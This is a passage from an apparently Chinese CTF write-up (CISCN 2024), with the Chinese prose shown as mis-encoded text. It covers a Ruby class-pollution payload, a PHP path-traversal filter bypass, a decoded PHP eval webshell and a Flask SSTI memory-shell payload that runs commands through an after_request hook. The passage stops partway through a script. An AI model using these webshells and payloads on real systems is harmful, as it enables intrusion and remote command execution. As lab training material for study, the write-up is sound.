<p>è°ƒè¯•ä¸€ä¸‹è¿™é‡Œçš„ setï¼Œå‘ç°å°±æ˜¯å®ƒæ¥è®¾ç½®å±æ€§</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323120322263.png" alt="image-20250323120322263"></p>
<p>class_eval å¯ä»¥ç»™ç±»åŠ¨æ€å®šä¹‰æ–¹æ³•</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323120157769.png" alt="image-20250323120157769"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥æ”¹å˜ JSONMergerApp.public_folder çš„å€¼</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323120752211.png" alt="image-20250323120752211"></p>
<p>æ­¤æ—¶å°±èƒ½è®¿é—®æ ¹ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶äº†</p>
<p>å°è¯•æ±¡æŸ“ public_folder</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250323114954277.png" alt="image-20250323114954277"></p>
<p>æ³¨æ„è¿™é‡Œè¦æ±¡æŸ“çš„æ˜¯ JSONMergerAppï¼Œæ˜¯ Sinatra::Base çš„å­ç±»ï¼ŒSinatra::Base æ˜¯ Object çš„å­ç±»ï¼Œæ‰€ä»¥è¿™é‡Œå¾—åµŒå¥—ä¸¤å±‚ subclasses</p>
<p>payloadï¼š</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"class"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"superclass"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"subclasses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"sample"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"public_folder"</span><span class="token operator">:</span> <span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœŸé—´å› ä¸ºéšæœºç±»è¦†ç›–ä¼šæœ‰å¤§é‡æŠ¥é”™ï¼Œæ— éœ€åœ¨æ„</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250320220322747.png" alt="image-20250320220322747"></p>
<p>æœ€åå¯ä»¥å‘ç°</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250320220636856.png" alt="image-20250320220636856"></p>
<p>æˆåŠŸè¦†ç›–</p>
<p>ç›´æ¥è®¿é—® &#x2F;flag å³å¯è¯»å–é™æ€æ–‡ä»¶</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20250321002135193.png" alt="image-20250321002135193"></p>
<hr>
<h1 id="hellowebï¼ˆå¤ç°ï¼‰"><a href="#hellowebï¼ˆå¤ç°ï¼‰" class="headerlink" title="hellowebï¼ˆå¤ç°ï¼‰"></a>hellowebï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php?file=hello.php</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sun, 15 Dec 2024 02:10:51 GMT</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Encoding</span></span>
<span class="token header"><span class="token header-name keyword">tip</span><span class="token punctuation">:</span> <span class="token header-value">&amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2470</span></span>

&lt;!-- ../hackme.php -->
&lt;!--  ../tips.php  -->


&lt;div class="relocating">
Navigating to: &lt;span class="relocate-location">&lt;/span>...
&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tipè§£ç å‡ºæ¥æ˜¯ include.phpï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸ªæ–‡ä»¶</p>
<p>index.phpï¼Œhello.phpï¼Œhackme.phpï¼Œtips.php å‡åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ä¸Šé¢çš„ hint é‡Œæ˜¯<code>../</code>ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„ ..&#x2F;hackme.php å®é™…ä¸Šè®¿é—®çš„ä¹Ÿæ˜¯ hackme.php</p>
<p>ç»“åˆ Navigating ï¼ŒçŒœæµ‹æ›¿æ¢äº†<code>../</code>ä¸ºç©ºï¼Œæœ‰åŒå†™ç»•è¿‡ï¼Œå°è¯•<code>..././hackme.php</code></p>
<p>èƒ½è¯»åˆ°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>$YwzIst æ˜¯ base64_decodeï¼Œdecodeåçš„å†…å®¹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uWcdaA</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox=="</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token variable">$OxirhK</span><span class="token punctuation">(</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¤åˆ¶åˆ°æœ¬åœ°ä¸€æ­¥æ­¥ echo åˆ†æå‡ºæ¥</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215170723989.png" alt="image-20241215170723989"></p>
<p>é‚£ä¹ˆshellå°±æ˜¯ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd_66.99'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>èšå‰‘è¿ä¸Šå»ï¼Œæ³¨æ„å¯†ç å‚æ•°è¿™é‡Œæ˜¯<code>cmd[66.99</code></p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- ../hackme.php --></span>
<span class="token comment">&lt;!--  ../tips.php  --></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ./index.php?file=hello.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    @<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php:\/\/|http|data|ftp|input|%00/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">14</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>NAIVE!!!&lt;/h1>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> 
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div style='text-align: center;'>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div>"</span><span class="token punctuation">;</span>
                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°è¯•æ‹¿èšå‰‘æ’ä»¶æ‰“disable_functionèƒ½å†™ï¼Œä½†æ˜¯è¿ .antproxy.php ä¸Šä¸å»ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<br>

<p>ç»“æŸåè¯•äº†ä¸€ä¸‹ç›´æ¥åœ¨ &#x2F;tmp å†™é©¬ index.phpï¼Œç„¶å fpm èµ· phpserver å¼€åœ¨ &#x2F;tmp ä¸‹ï¼Œå¯†ç å¡« &#x2F;tmp&#x2F;index.php çš„å³å¯ç»•è¿‡ disable_function ä¸”æ­£å¸¸è¿æ¥</p>
<p>æ¥ä¸‹æ¥æ‰¾flagï¼Œæœ¬æ¥ä»¥ä¸ºè¦ææƒçš„ï¼Œæ‰¾äº†åŠå¤©æ²¡ææƒç‚¹</p>
<p><code>find / -type f -name &quot;flag&quot; 2&gt;/dev/null</code>æ‰¾åˆ°äº†ç¥äººflagè·¯å¾„</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215204605743.png" alt="image-20241215204605743"></p>
<hr>
<h1 id="safeproxy"><a href="#safeproxy" class="headerlink" title="safeproxy"></a>safeproxy</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> html

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;pre>'</span><span class="token operator">+</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&lt;/pre>'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    template_code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>
    <span class="token comment"># å®‰å…¨è¿‡æ»¤</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> black <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> black <span class="token keyword">in</span> template_code<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Forbidden content detected!"</span>
    result <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>template_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'ok'</span> <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'error'</span>

<span class="token keyword">class</span> <span class="token class-name">HTTPProxyHandler</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host
        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port

    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            request_data <span class="token operator">=</span> <span class="token string">b""</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                chunk <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
                request_data <span class="token operator">+=</span> chunk
                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span><span class="token punctuation">:</span>
                    <span class="token keyword">break</span>

            <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">:</span>
                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>

            <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy_socket<span class="token punctuation">:</span>
                proxy_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
                proxy_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_data<span class="token punctuation">)</span>

                response_data <span class="token operator">=</span> <span class="token string">b""</span>
                <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                    chunk <span class="token operator">=</span> proxy_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>
                        <span class="token keyword">break</span>
                    response_data <span class="token operator">+=</span> chunk

            header_end <span class="token operator">=</span> response_data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b"\r\n\r\n"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> header_end <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> response_data<span class="token punctuation">[</span>header_end <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> response_data
                
            response_body <span class="token operator">=</span> body
            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 200 OK\r\n"</span> \
                       <span class="token string">b"Content-Length: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\r\n"</span> \
                       <span class="token string">b"Content-Type: text/html; charset=utf-8\r\n"</span> \
                       <span class="token string">b"\r\n"</span> <span class="token operator">+</span> response_body

            client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">start_proxy_server</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    proxy_handler <span class="token operator">=</span> HTTPProxyHandler<span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>
    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy server is running on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string"> and forwarding to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>proxy_handler<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shutting down proxy server..."</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run_flask_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    proxy_host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
    proxy_port <span class="token operator">=</span> <span class="token number">5001</span>
    target_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
    target_port <span class="token operator">=</span> <span class="token number">5000</span>

    <span class="token comment"># å®‰å…¨åä»£ï¼Œé˜²æ­¢é’ˆå¯¹å“åº”å¤´çš„æ”»å‡»</span>
    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_proxy_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>proxy_host<span class="token punctuation">,</span> proxy_port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    proxy_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Starting Flask app..."</span><span class="token punctuation">)</span>
    run_flask_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€çœ¼æ‰“sstiï¼Œban äº†å“åº”å¤´</p>
<p>æ‰“å†…å­˜é©¬åœ¨å“åº”ä½“é‡Œå°±è¡Œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing
<span class="token keyword">import</span> logging

<span class="token keyword">import</span> requests

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
[
    app.view_functions
    for app in [ __import__('sys').modules["__main__"].app ]
    for request in [ __import__('sys').modules["__main__"].request ]
    if [
        app.__dict__.update(&#123;'_got_first_request':False&#125;),
        app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)
    ]
]
"""</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'\\'</span> <span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>


full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>
payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>
    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è¿™ä¸ªpayloadä¸ä¼šäº§ç”Ÿå›æ˜¾"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
